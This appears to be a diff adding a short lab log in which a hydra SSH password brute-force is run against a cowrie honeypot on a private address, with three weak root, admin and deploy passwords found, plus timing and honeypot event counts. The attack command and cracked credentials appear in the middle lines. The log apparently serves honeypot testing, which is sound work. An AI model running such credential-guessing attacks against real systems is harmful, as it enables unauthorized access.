@@ -1,0 +1,14 @@
+idle 60 s cpu 0 us
+# hydra -L /tmp/users.txt -P /tmp/passwords.txt -s 2222 -t 1 ssh://172.30.0.3
+[DATA] max 1 task per 1 server, overall 1 task, 18 login tries (l:3/p:6), ~18 tries per task
+[2222][ssh] host: 172.30.0.3   misc: (null)   login: root   password: Passw0rd
+[2222][ssh] host: 172.30.0.3   misc: (null)   login: admin   password: admin123
+[2222][ssh] host: 172.30.0.3   misc: (null)   login: deploy   password: deploy2024
+1 of 1 target successfully completed, 3 valid passwords found
+attack 10386 ms wall cpu 159945 us
+      4 cowrie.client.kex
+      4 cowrie.client.version
+      3 cowrie.login.failed
+      3 cowrie.login.success
+      4 cowrie.session.closed
+      4 cowrie.session.connect
